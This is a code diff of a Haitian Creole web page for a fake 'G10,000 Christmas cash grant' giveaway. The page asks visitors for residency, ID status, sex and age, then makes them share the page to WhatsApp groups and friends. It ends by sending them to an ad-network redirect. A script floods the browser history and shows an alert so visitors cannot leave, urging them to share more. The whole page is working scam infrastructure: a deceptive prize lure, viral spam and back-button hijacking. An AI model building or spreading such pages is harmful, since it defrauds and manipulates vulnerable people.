@@ -27,8 +27,9 @@
 <vue-modal :open="showInstructionsModal">
 <h2 class="heading heading--h1">Felisitasyon! Repons ou yo anrejistre</h2>
 <p class="paragraph">
-Koulye a ou gen yon chans pou genyen G10,000 nan sibvansyon Wyn<br><br>
-Ou gen 3 chans! Nou swete ou bon chans<br><br>
+Koulye a ou gen yon chans pou genyen G10,000 nan pri lajan Wyn<br><br>
+Ou gen 3 chans! Nou swete ou bon chans
+<br><br>
 Ou bezwen chwazi bwat ki gen kado a ladan l.
 </p>
 <button class="button" v-on:click="showInstructionsModal = false">Kòmanse</button>
@@ -41,66 +42,70 @@ Ou bezwen chwazi bwat ki gen kado a ladan l.
 </vue-modal>
 
 <vue-modal :open="showSuccessModal">
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTij5mlPsKx4UIqreveNr5p04a0CjJzZT3Rdg&s" style="width: 240px;">
 <h1 class="heading heading--h1">Felisitasyon!</h1>
 <p class="paragraph">
 Pri ou se: <b>G10,000 lajan kach</b><br>
 Swiv enstriksyon ki sou pwochen paj la pou reklame pri ou!
 </p>
-<button class="button" onclick="go();">OK</button>
+<button class="button" v-on:click="$confetti.stop()" onclick="go();">OK</button>
 </vue-modal>
 
 <h1 class="heading heading--h1">Bonjou!</h1>
 <p class="paragraph">
-Byenvini nan <b>G10,000 nan men Wyn – Sibvansyon Lajan Nwèl an patenarya ak Clie pou Ayisyen</b>.<br>
-Pa rate sibvansyon lajan Nwèl G10,000 sa a pou tout Ayisyen.<br>
-Reponn kestyon ki anba yo pou reklame <b>pri G10,000 lajan kach</b>.
+Byenvini nan <b>G10,000 nan men Wyn – Sibvansyon Lajan Nwèl an patenarya ak Clie pou Ayisyen</b>, pa rate sibvansyon lajan Nwèl G10,000 sa a pou tout Ayisyen.
+<br>
+Reponn kestyon ki anba yo pou reklame <b>pri G10,000 lajan kach</b>
 </p>
 
-<vue-survey :questions='[
-{ title: "Èske ou se yon rezidan Ayiti?", answers: [{ text: "Wi" }, { text: "Non" }] },
-{ title: "Èske ou gen nimewo idantite Ayisyen?", answers: [{ text: "Wi" }, { text: "Non" }] },
-{ title: "Chwazi sèks ou?", answers: [{ text: "Gason" }, { text: "Fi" }] },
-{ title: "Chwazi ranje laj ou?", answers: [
+<vue-survey v-if="showSurvey" :show-steps="true" :questions='[
+{
+title: "Èske ou se yon rezidan Ayiti?",
+answers: [{ text: "Wi" }, { text: "Non" }]
+},
+{
+title: "Èske ou gen nimewo idantite Ayisyen?",
+answers: [{ text: "Wi" }, { text: "Non" }]
+},
+{
+title: "Chwazi sèks ou?",
+answers: [{ text: "Gason" }, { text: "Fi" }]
+},
+{
+title: "Chwazi ranje laj ou?",
+answers: [
 { text: "18 - 20 an" },
 { text: "21 - 25 an" },
 { text: "26 - 30 an" },
 { text: "30 an oswa plis" }
-]}
-]'></vue-survey>
+]
+}
+]' v-on:finish="onSurveyFinish"></vue-survey>
 
 </div>
 </div>
 
 <div id="share">
 <p class="title1">Felisitasyon!</p>
-
-<p class="txt1">
-Pri ou se: <b>G10,000</b><br>
-Swiv enstriksyon ki anba yo pou reklame pri ou!
-</p>
+<p class="txt1">Pri ou se: <b>G10,000</b><br>Swiv enstriksyon ki anba yo pou reklame pri ou!</p>
 
 <p class="rules">1. Pataje ak 5 gwoup / 15 zanmi sou WhatsApp (klike sou ikòn WhatsApp la)</p>
-<p class="rules">2. Klike sou “Kontinye” pou reklame pri ou</p>
+<p class="rules">2. Klike sou “Kontinye” epi reklame pri ou</p>
 
 <div class="share_main_bt" id="whatsapp">WhatsApp →</div>
 <h4 class="textlastup">Pataje jiskaske ba ble a ranpli!</h4>
-
 <div class="share_main_bt" onclick="tipn()">Kontinye</div>
 </div>
 
 <div id="claim">
 <p class="title1">Felisitasyon!</p>
-
-<p class="txt1">
-Pri ou se: <b>G10,000 lajan kach</b><br>
-Swiv enstriksyon ki anba yo pou reklame pri ou!
-</p>
+<p class="txt1">Pri ou se: <b>G10,000 lajan kach.</b><br>Swiv enstriksyon ki anba yo pou reklame pri ou!</p>
 
 <button class="share_main_bt">REKLAME G10,000</button>
-<div class="share_main_bt">CHWAZI KALITE KONT</div>
+<div class="share_main_bt" id="offer">CHWAZI KALITE KONT</div>
 <button class="share_main_bt">KONT EKONOMI</button>
 <button class="share_main_bt">KONT KOURAN</button>
-<div class="share_main_bt">Retire G10,000</div>
+<div class="share_main_bt" id="offers">Retire G10,000</div>
 </div>
 
 <script>
@@ -111,7 +116,7 @@ error = "Gen yon erè!\nPataje yo pa konte. Ou ka pataje ak menm zanmi oswa gwou
 cpa = "https://luglawhaulsano.net/4/8631702",
 cpa1 = "https://luglawhaulsano.net/4/8631702",
 saved = "coke2",
-share = "whatsapp://send?text=" + text1;
+share = "whatsapp://send?text=" + text1 ;
 </script>
 
 <script>
@@ -137,7 +142,7 @@ var t;
 try{
 for(t=0; t<10; ++t) history.pushState({}, "", "#");
 onpopstate=function(t){
-t.state && alert("Tanpri pataje plis pou resevwa kado a.");
+t.state && alert('Tanpri pataje plis pou resevwa kado a.');
 }
 }catch(o){}
 }();
